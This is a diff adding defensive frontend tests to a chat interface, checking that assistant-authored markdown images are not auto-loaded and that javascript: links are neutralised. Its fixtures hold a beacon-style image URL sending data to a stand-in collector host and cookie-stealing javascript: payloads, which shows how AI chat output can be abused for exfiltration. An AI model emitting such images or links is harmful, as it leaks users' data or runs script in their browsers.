@@ -240,3 +240,67 @@ describe('citation chips', () => {
     expect(screen.getByText(/\[file:zzz\|Projects\/unknown\.pdf\]/)).toBeInTheDocument();
   });
 });
+
+describe('markdown image and link rendering', () => {
+  function assistantMessage(content: string) {
+    return [{ id: 'a1', role: 'assistant' as const, content, createdAt: new Date() }];
+  }
+
+  it('does not render an <img> element for a model-authored markdown image', () => {
+    useChatStore.setState(
+      baseChatState({
+        messages: assistantMessage(
+          'Here is the log summary: ![](https://collector.example/x?d=hostname-and-ip-here)',
+        ),
+      }),
+    );
+
+    const { container } = renderChatView();
+
+    expect(container.querySelector('img')).toBeNull();
+  });
+
+  it('renders the image as a click-through link with an http(s) href instead', () => {
+    useChatStore.setState(
+      baseChatState({ messages: assistantMessage('![beacon](https://collector.example/x?d=secret)') }),
+    );
+
+    renderChatView();
+
+    const link = screen.getByRole('link', { name: 'beacon' });
+    expect(link).toHaveAttribute('href', 'https://collector.example/x?d=secret');
+    expect(link).toHaveAttribute('target', '_blank');
+  });
+
+  it('drops a non-http(s) image source (javascript:, data:) without linking it', () => {
+    useChatStore.setState(
+      baseChatState({ messages: assistantMessage('![payload](javascript:alert(document.cookie))') }),
+    );
+
+    const { container } = renderChatView();
+
+    expect(container.querySelector('img')).toBeNull();
+    expect(screen.queryByRole('link', { name: 'payload' })).toBeNull();
+  });
+
+  it('still renders a plain http(s) markdown link as a clickable anchor', () => {
+    useChatStore.setState(
+      baseChatState({ messages: assistantMessage('[click me](https://example.com/page)') }),
+    );
+
+    renderChatView();
+
+    expect(screen.getByRole('link', { name: 'click me' })).toHaveAttribute(
+      'href',
+      'https://example.com/page',
+    );
+  });
+
+  it('does not resolve a javascript: markdown link to an executable href', () => {
+    useChatStore.setState(baseChatState({ messages: assistantMessage('[click me](javascript:alert(1))') }));
+
+    renderChatView();
+
+    expect(screen.getByRole('link', { name: 'click me' })).toHaveAttribute('href', '#');
+  });
+});
